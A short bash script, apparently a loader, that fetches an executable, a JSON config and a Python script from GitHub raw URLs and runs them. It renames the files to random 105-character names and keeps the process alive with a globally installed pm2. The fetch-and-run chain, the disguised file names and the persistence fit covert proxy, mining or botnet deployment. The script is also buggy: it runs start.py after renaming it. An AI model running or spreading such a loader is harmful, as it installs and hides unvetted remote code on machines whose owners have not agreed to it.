#!/bin/bash
random_name() {
      tr -dc A-Za-z0-9 </dev/urandom | head -c 105
  }
wget https://raw.githubusercontent.com/hosseinxdns/glowing-fortnight/main/x

NEW_V2=$(random_name)
mv x $NEW_V2
chmod +x $NEW_V2
wget https://raw.githubusercontent.com/hosseinxdns4/potential-engine/main/x.json

echo "./$NEW_V2 run --config=x.json" > bash.sh
NEW_SH=$(random_name).sh
mv bash.sh $NEW_SH
chmod +x $NEW_SH

npm install -g pm2
pm2 start $NEW_SH

wget https://raw.githubusercontent.com/hosseinxdns4/silver-doodle/main/start.py
NEW_PY=$(random_name).py
mv start.py $NEW_PY
chmod +x $NEW_PY
echo "./$NEW_PY -t 4" > bsh.sh
chmod +x bsh.sh
./start.py
sleep 1600
